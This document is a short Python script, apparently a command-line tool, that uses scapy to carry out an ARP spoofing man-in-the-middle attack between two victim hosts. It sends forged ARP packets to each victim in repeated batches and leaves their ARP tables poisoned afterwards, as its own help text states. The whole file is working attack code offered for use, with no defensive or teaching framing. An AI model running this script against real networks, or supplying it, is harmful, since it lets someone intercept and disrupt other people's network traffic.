import threading
import argparse
import logging
import time
from scapy.all import ARP, send


def continueAttack():
    choice = input('\nWould you like to send another batch of requests? [Y/n]: ')

    while choice not in ['y', 'n', '']:
        choice = input('Would you like to send another batch of requests? [Y/n]: ')

    return choice in ['y', '']


def poisonTableOfHost(targetIP, ipToDisguiseAs, numberOfTries, timeout):
    logging.getLogger('scapy').setLevel(logging.ERROR)
    arpPacket = ARP(pdst=targetIP, psrc=ipToDisguiseAs)

    for _ in range(numberOfTries):
        send(arpPacket)
        time.sleep(timeout)


parser = argparse.ArgumentParser(
    description='Executes an ARP man-in-the-middle attack between two specified hosts.',
    epilog='This script will not restore the ARP tables to their original state after termination. Clean your own mess up!'
)

parser.add_argument('-v', '--victims', nargs=2, required=True, type=str, dest='victims', help='the IPs of the two target hosts', metavar='VICTIM')
parser.add_argument('-n', '--number-of-tries', default=10, type=int, dest='numberOfTries', help='number of requests in a batch per victim; defaults to 10', metavar='NUMBER-OF-TRIES')
parser.add_argument('-t', '--timeout', default=2, type=int, dest='timeout', help='time between requests; defaults to 2s')

arguments = parser.parse_args()


try:
    firstThread = threading.Thread(target=poisonTableOfHost, args=(arguments.victims[0], arguments.victims[1], arguments.numberOfTries, arguments.timeout), daemon=True)
    secondThread = threading.Thread(target=poisonTableOfHost, args=(arguments.victims[1], arguments.victims[0], arguments.numberOfTries, arguments.timeout), daemon=True)

    print('[*] ARP Spoofing initiated')
    print('[*] Table poisoning in progress...')
    firstThread.start()
    secondThread.start()

    firstThread.join()
    secondThread.join()

    while continueAttack():
        firstThread = threading.Thread(target=poisonTableOfHost, args=(
        arguments.victims[0], arguments.victims[1], arguments.numberOfTries, arguments.timeout), daemon=True)
        secondThread = threading.Thread(target=poisonTableOfHost, args=(
        arguments.victims[1], arguments.victims[0], arguments.numberOfTries, arguments.timeout), daemon=True)

        print('[*] Table poisoning in progress..')
        firstThread.start()
        secondThread.start()
        firstThread.join()
        secondThread.join()

    print('[*] Goodbye!')
except KeyboardInterrupt:
    print('[*] Goodbye!')
